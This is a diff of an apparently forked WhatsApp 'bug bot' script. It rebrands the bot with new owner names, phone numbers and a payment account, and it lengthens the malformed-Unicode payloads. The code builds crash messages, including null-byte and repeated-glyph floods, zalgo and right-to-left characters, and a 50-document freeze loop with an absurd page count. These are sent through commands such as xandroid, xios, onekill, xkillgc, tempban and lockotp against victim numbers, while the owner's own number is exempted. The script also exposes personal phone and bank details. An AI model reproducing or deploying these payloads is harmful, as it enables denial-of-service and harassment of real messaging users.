-            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
+            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ ‫‪‫҈꙲C̸R꙰̸A꙰̸S꙰̸H꙰̸"
           },
           'footer': {
             'text': 'xp'
@@ -457,7 +457,7 @@ async function sendListMessage(jid) {
   var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
     'listMessage': {
       'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
-      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
+      'footerText': "𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹ ๖ມG꙰ཀ͜͡✅⃟╮",
       'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
       'buttonText': null,
       'listType': 2,
@@ -510,7 +510,7 @@ async function sendLiveLocationMessage(jid) {
         'liveLocationMessage': {
           'degreesLatitude': 'p',
           'degreesLongitude': 'p',
-          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
+          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ𓆩ঔৣ͜͡҉ꦾ𝐇͜͡𝚲𝙓𝞝𝙍' + 'ꦾ'.repeat(50000),
           'sequenceNumber': '0',
           'jpegThumbnail': ''
         }
@@ -536,7 +536,7 @@ async function sendExtendedTextMessage(jid) {
         'stanzaId': jid,
         'participant': jid,
         'quotedMessage': {
-          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
+          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾঔৣ͜͡҉ꦾ'.repeat(50000)
         },
         'disappearingMode': {
           'initiator': "CHANGED_IN_CHAT",
@@ -684,12 +684,12 @@ caption: `${dgxeon + xeontext1}`,
 
 async function loading () {
 var xeonlod = [
-"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
-"《 ████▒▒▒▒▒▒▒▒》30%",
-"《 ███████▒▒▒▒▒》50%",
-"《 ██████████▒▒》80%",
+"《 █▒▒▒▒▒▒》10%",
+"《 ████▒▒▒▒▒》30%",
+"《 ███████▒▒▒》50%",
+"《 █████████▒▒》80%",
 "《 ████████████》100%",
-"𝚂𝚃𝙸𝙽𝙶𝙴𝚁-𝚅𝟸 𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
+"  𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
 ]
 let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
 
@@ -1108,7 +1108,7 @@ senddocu(buffer)
                 replygcxeon(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                 for (let i of anu) {
                     await sleep(1500)
-                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
+                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\n'
                     XeonBotInc.sendMessage(i, {
                         text: a,
                         contextInfo: {
@@ -1116,10 +1116,10 @@ senddocu(buffer)
                                 showAdAttribution: true,
                                 title: 'Broadcast By Owner',
                                 body: `Sent ${i.length} Group`,
-                                thumbnailUrl: 'https://telegra.ph/file/c02035e9c30f7b6da1b29.jpg',
+                                thumbnailUrl: 'https://i.ibb.co/qF53V71/image.jpg',
                                 sourceUrl: global.link,
                                 mediaType: 1,
-                                renderLargerThumbnail: true
+                                renderLargerThumbnail: false
                             }
                         }
                     })
@@ -1406,13 +1406,13 @@ senddocu(buffer)
                 respon = `
 Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
 
-💻 Stinger-V2 Info Server
+💻  Info Server
 RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
 
-_Stinger-V2 NodeJS Memory Usage🚧_
+_ NodeJS Memory Usage🚧_
 ${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
 
-${cpus[0] ? `_Stinger-V2 Total CPU Usage🧑‍🔧_
+${cpus[0] ? `_ Total CPU Usage🧑‍🔧_
 ${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
 _CPU Core(s) Usage (${cpus.length} Core CPU)_
 ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
@@ -1424,7 +1424,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${latensi.toFixed(4)} Second`,
-                            thumbnailUrl: 'https://i.ibb.co/WVjs0r4/IMG-20240906-WA0025.jpg',
+                            thumbnailUrl: 'https://i.ibb.co/qF53V71/image.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1438,7 +1438,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'buypremium':
             case 'buyprem':
             case 'premium': {
-                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ👑😉👉09037524605`
+                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with😉👉03253444558`
                 await XeonBotInc.sendMessage(m.chat, {
                     text: teks,
                     contextInfo: {
@@ -1446,7 +1446,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${ownername}`,
-                            thumbnailUrl: 'https://i.ibb.co/WVjs0r4/IMG-20240906-WA0025.jpg',
+                            thumbnailUrl: 'https://i.ibb.co/qF53V71/image.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1458,7 +1458,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             }
             break
             case 'runtime':
-                let runtimetext = `S҉ t҉  i҉ n҉ g҉ e҉ r҉- V҉ 2҉ 𝐇𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫 ${runtime(process.uptime())}`
+                let runtimetext = ` V҉ 2҉ 𝐇𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫 ${runtime(process.uptime())}`
                 XeonBotInc.sendMessage(m.chat, {
                     text: runtimetext,
                     contextInfo: {
@@ -1466,7 +1466,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ👑`,
-                            thumbnailUrl: 'https://i.ibb.co/WVjs0r4/IMG-20240906-WA0025.jpg',
+                            thumbnailUrl: 'https://i.ibb.co/qF53V71/image.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1486,7 +1486,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `SCRIPT OF ${botname} is on YouTube @esteams`,
-                            thumbnailUrl: 'https://i.ibb.co/WVjs0r4/IMG-20240906-WA0025.jpg',
+                            thumbnailUrl: 'https://i.ibb.co/qF53V71/image.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1500,7 +1500,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'donasi':
                 let textnate = `Hello Cutie💕 ${pushname}\n\nNo matter how much you donate is very valuable for us❤️`
                 XeonBotInc.sendMessage(m.chat, {
-                    text: 'Zenith 🏦 Acct No: 2409139282😊 Acct Name: Paschal JE\n\n' + textnate
+                    text: 'Easypaisa🏦 Acct No: 03127956365😊 Acct Name: Muhammad Saleh Zubair\n\n' + textnate
                 }, {
                     quoted: m
                 })
@@ -1510,7 +1510,7 @@ const repf = await XeonBotInc.sendMessage(from, {
 contacts: { 
 displayName: `${list.length} Contact`, 
 contacts: list }, mentions: [sender] }, { quoted: m })
-XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Hi ${pushname} . My  handsome owner is no other person than ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ👑,i just love that dude so much`, mentions: [sender]}, { quoted: repf })
+XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Hi ${pushname} . My  handsome owner is no other person than SALEH👑`, mentions: [sender]}, { quoted: repf })
 }
 break
             case 'sticker':
@@ -2285,7 +2285,7 @@ case "xandroid": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2348187637779") {
+  if (cleanedNumber == "923253444558") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2297,7 +2297,7 @@ case "xandroid": {
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
     "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause for 2mins so that  S҉ t҉ i҉ n҉ g҉ e҉ r҉- V҉ 2҉ doesn't get your account banned✅. Thank you for choosing S҉ t҉  i҉ n҉ g҉ e҉ r҉- V҉ 2҉", 
+    " Using *" + command + "* ✅\n\nPause for 2mins so that - V҉ 2҉ doesn't get your account banned✅.", 
     [whatsappNumber]
   );
 }
@@ -2317,7 +2317,7 @@ case "xios": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2348187637779") {
+  if (cleanedNumber == "923253444558") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2329,7 +2329,7 @@ case "xios": {
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
     "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause for 2mins so that  S҉ t҉ i҉ n҉ g҉ e҉ r҉- V҉ 2҉ doesn't get your account banned✅. Thank you for choosing S҉ t҉  i҉ n҉ g҉ e҉ r҉- V҉ 2҉", 
+    " Using *" + command + "* ✅\n\nPause for 2mins so that  - V҉ 2҉ doesn't get your account banned✅.", 
     [whatsappNumber]
   );
 }
@@ -2433,7 +2433,7 @@ case "xios2":
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2348187637779") {
+  if (cleanedNumber == "923253444558") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2465,7 +2465,7 @@ case "xsysui": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2348187637779") {
+  if (cleanedNumber == "923253444558") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2490,13 +2490,13 @@ let cleanedNumber = text.replace(/[^0-9]/g, '');
 if (cleanedNumber.startsWith('0')) return replygcxeon(`Example : ${prefix+command} 916909137213`)
 var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2348187637779") {
+  if (cleanedNumber == "923253444558") {
     return;
     }
-    if (cleanedNumber == "2348187637779") {
+    if (cleanedNumber == "923253444558") {
     return;
     }
-    if (cleanedNumber == "2348187637779") {
+    if (cleanedNumber == "923253444558") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2507,11 +2507,11 @@ var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net")
 					const crasoh = await XeonBotInc.relayMessage(jid,
 						{
 							extendedTextMessage: {
-								text: '🦄드림 가이 Xeon',
+								text: '🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲',
 								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
 								canonicalUrl: 'https://example.com',
-								description: '🦄드림 가이 Xeon  🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon',
-								title: '🦄드림 가이 Xeon',
+								description: '🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲  🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲',
+								title: '🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲',
 								textArgb: 0xff000000,
 								backgroundArgb: 0xffffffff,
 								font: 1,
@@ -2559,7 +2559,7 @@ var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net")
 											{
 												name: 'payment_info',
 												buttonParamsJson:
-													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"🦄드림 가이 Xeon","key":"+916909137213","key_type":"X"}}]}',
+													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲","key":"+916909137213","key_type":"X"}}]}',
 											},
 										],
 									},
@@ -2583,7 +2583,7 @@ var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net")
 											subtitle: ' ',
 										},
 										body: {
-											text: '🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon',
+											text: '🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲',
 										},
 										footer: {
 											text: 'xp',
@@ -2618,18 +2618,18 @@ await replygcxeon(`In process....`)
 				break;
 				case 'xpayment': {
 					if (!isPremium) return replygcxeon(mess.prem)
-if (!text) return replygcxeon(`Usage .${command} 2348187637779`)
+if (!text) return replygcxeon(`Usage .${command} 923253444558`)
 let cleanedNumber = text.replace(/[^0-9]/g, '');
 if (cleanedNumber.startsWith('0')) return replygcxeon(`Example : ${prefix+command} 916909137213`)
 var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2348187637779") {
+  if (cleanedNumber == "923253444558") {
     return;
     }
-    if (cleanedNumber == "2348187637779") {
+    if (cleanedNumber == "923253444558") {
     return;
     }
-    if (cleanedNumber == "2348187637779") {
+    if (cleanedNumber == "923253444558") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2673,7 +2673,7 @@ var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net")
 				break;
 		case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
 if (!isPremium) return replygcxeon(mess.prem)
-if (!q) return replygcxeon(`Usage .${command} 2348187637779`)
+if (!q) return replygcxeon(`Usage .${command} 923253444558`)
 let xeonyvictim = q.replace(/[^0-9]/g, "")
 if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 916909137213`)
 let target = xeonyvictim + '@s.whatsapp.net'
@@ -2710,9 +2710,9 @@ async function xeonFreeze(jid){
 	  for (let i = 0; i < 50; i++) {
 await XeonBotInc.sendMessage(jid, {
     'document': XeonDoc,
-    'fileName': "🦄드림 가이 Xeon" + xeontext1,
+    'fileName': "🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲" + xeontext1,
     'mimetype': "application/zip",
-    'caption': "🦄드림 가이 Xeon" + xeontext1,
+    'caption': "🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲" + xeontext1,
     'pageCount': 0x3b9aca00,
     'contactVcard': true
 });
@@ -2725,7 +2725,7 @@ await xeonFreeze(m.chat);
 	case 'xkillgc': case 'xblankscrn': case 'xwebgc': {
 		if (!isPremium) return replygcxeon(mess.prem)
 		const xeonimage = {
-    title: "🦄드림 가이 Xeon; ",
+    title: "🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲; ",
     hasMediaAttachment: true,
     imageMessage: thumb.imageMessage
 };
@@ -2744,7 +2744,7 @@ XeonBotInc.relayMessage(m.chat, {
                     'buttons': [{
                         'name': "galaxy_message",
                         'buttonParamsJson': JSON.stringify({
-                            'header': "🦄드림 가이 Xeon; ",
+                            'header': "🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲; ",
                             'body': "xxx",
                             'flow_action': "navigate",
                             'flow_action_payload': {
@@ -2776,7 +2776,7 @@ XeonBotInc.relayMessage(m.chat, {
                     'forwardedNewsletterMessageInfo': {
                         'newsletterJid': "120363222395675670@newsletter",
                         'serverMessageId': 0x1,
-                        'newsletterName': "🦄드림 가이 Xeon"
+                        'newsletterName': "🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲"
                     }
                 }
             }
@@ -2804,8 +2804,8 @@ title: `Xeon's ur father`
     {
       document: { url: "./settings.js" },
       mimetype: `image/null`,
-      fileName: `🦄드림 가이 Xeon${xeontext11}`,
-      caption: `🦄드림 가이 Xeon ${xeontext11}`,
+      fileName: `🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲${xeontext11}`,
+      caption: `🦄드림𓄂͜͡ঔৣ͜͡҉҉҉𓆩𝐇͜͡𝚲𝙓𝞝𝙍⁰⁹⁹⁨⁨𓆪࿐ꥈ‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ ${xeontext11}`,
     },
     { quoted: { ...subscribe_dgxeon, key: { ...subscribe_dgxeon.key, participant } } }  // Includes the quoted participant
   );
@@ -2832,7 +2832,7 @@ case 'lockotp': case 'tempban': {
   const xeonMention = xeonmerge + '@s.whatsapp.net';
   sendMessageWithMentions(
     "ES TEAMS HAS SUCCESSFULLY ACTIVATED OTP LOCK😅 To @" + xeonMention.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause for 2mins so that  S҉ t҉ i҉ n҉ g҉ e҉ r҉- V҉ 2҉ doesn't get your account banned✅. Thank you for choosing S҉ t҉  i҉ n҉ g҉ e҉ r҉- V҉ 2҉", 
+    " Using *" + command + "* ✅\n\nPause for 2mins so that  - V҉ 2҉ doesn't get your account banned✅.", 
     [xeonMention]
   );
   try {
@@ -2885,15 +2885,13 @@ break
             case '?':
             case 'allmenu':
                 let xeonmenuoh = `
-╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 2҉━━━━━━╮
-┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ 🚀👽
-┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ 2.0.0 🔝💻
-┃❁️ _ᴍᴏᴅᴇʟ:_ ꜱᴛɪɴɢᴇʀ 🤖💸
+╭━━━━━━❄️◁️🕷️ ★彡[𝐇͜͡𝚲𝙓𝞝𝙍]彡★V-2҉━━━━━━╮
+┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ-ᴛᴇᴄʜ 🚀👽 
 ┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${runtime(process.uptime())} ⏰🔋
 ╰━━━━━━❄️◁️🕷️━━━━━━╯
 ╰⭑➤➤⭑➤➤⭑➤ ${xeonytimewisher} 😄
 ${readmore}
-╰⭑➤➤⭑➤➤⭑➤ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ
+╰⭑➤➤⭑➤➤⭑➤ *ʙᴜɢ ᴀɴᴅʀᴏɪᴅ*
 > 𝐱𝐚𝐧𝐝𝐫𝐢𝐨𝐝 ◁️❄️🕷️
 > 𝐱𝐚𝐧𝐝𝐫𝐢𝐨𝐝𝟐 ◁️❄️🕷️
 > 𝐬𝐲𝐬𝐭𝐞𝐦𝐮𝐢𝐜𝐫𝐚𝐬𝐡 ◁️❄️🕷️
@@ -2903,29 +2901,29 @@ ${readmore}
 > 𝐨𝐧𝐞𝐤𝐢𝐥𝐥◁️❄️🕷️
 > 𝐱𝐟𝐫𝐞𝐞𝐳𝐞 ◁️❄️🕷️
 
-╰⭑➤➤⭑➤➤⭑➤ ʙᴜɢ ᴡᴇʙ
+╰⭑➤➤⭑➤➤⭑➤ *ʙᴜɢ ᴡᴇʙ*
 > 𝐱𝐟𝐫𝐞𝐞𝐳𝐞 ◁️❄️🕷️
 > 𝐱𝐛𝐥𝐚𝐧𝐤𝐬𝐜𝐫𝐧 ◁️❄️🕷️
 > 𝐱𝐰𝐞𝐛𝐠𝐜 ◁️❄️🕷️
 
-╰⭑➤➤⭑➤➤⭑➤ ʙᴜɢ ɪᴏꜱ
+╰⭑➤➤⭑➤➤⭑➤ *ʙᴜɢ ɪᴏꜱ*
 > 𝐱𝐢𝐨𝐬 ◁️❄️🕷️
 > 𝐱𝐢𝐨𝐬𝟐 ◁️❄️🕷️
 > 𝐢𝐨𝐬𝐤𝐢𝐥𝐥 ◁️❄️🕷️
 > 𝐱𝐢𝐨𝐬𝐟𝐫𝐞𝐞𝐳𝐞 ◁️❄️🕷️
 > 𝐱𝐢𝐨𝐬𝐡𝐨𝐭 ◁️❄️🕷️
 
-╰⭑➤➤⭑➤➤⭑➤ ʙᴜɢ ᴏᴛʜᴇʀ
+╰⭑➤➤⭑➤➤⭑➤ *ʙᴜɢ ᴏᴛʜᴇʀ*
 > 𝐭𝐞𝐦𝐩𝐛𝐚𝐧 ◁️❄️🕷️
 > 𝐥𝐨𝐜𝐤𝐨𝐭𝐩 ◁️❄️🕷️
 
-╰⭑➤➤⭑➤➤⭑➤ ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ
+╰⭑➤➤⭑➤➤⭑➤ *ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ*
 > 𝐰𝐞𝐛𝐠𝐜 ◁️❄️🕷️
 > 𝐚𝐧𝐝𝐫𝐨𝐠𝐜 ◁️❄️🕷️
 > 𝐢𝐨𝐬𝐠𝐜 ◁️❄️🕷️
 > 𝐱𝐣𝐩𝐦𝐠𝐜 ◁️❄️🕷️
 
-╰⭑➤➤⭑➤➤⭑➤ ʙᴀɴ/ᴜɴʙᴀɴ ᴍᴇɴᴜ
+╰⭑➤➤⭑➤➤⭑➤ *ʙᴀɴ/ᴜɴʙᴀɴ ᴍᴇɴᴜ*
 > 𝐛𝐚𝐧𝐯𝟏 ◁️❄️🕷️
